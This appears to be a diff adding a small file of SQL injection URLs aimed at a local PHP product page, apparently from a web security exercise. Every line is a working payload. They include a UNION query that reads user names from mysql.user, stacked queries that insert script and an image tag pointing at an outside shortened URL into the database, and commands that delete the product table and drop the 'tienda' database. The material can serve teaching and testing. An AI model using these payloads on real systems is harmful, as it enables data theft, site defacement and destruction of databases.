@@ -1,0 +1,6 @@
+http://localhost:3000/productos.php?id=-1 union select 1,user,3,4 from mysql.user--
+http://localhost:3000/productos.php?id=-1 union select 1,2,concat(nombre,' codigo malicioso'),4 from fabricante--
+http://localhost:3000/productos.php?id=-1; insert into fabricante(nombre) values('<script>alert("Hackeado")</script>')--
+http://localhost:3000/productos.php?id=-1; insert into fabricante(nombre) values('<img src="https://shorturl.at/ow268"/>')--
+http://localhost:3000/productos.php?id=-1; delete from producto--
+http://localhost:3000/productos.php?id=-1; drop database tienda--
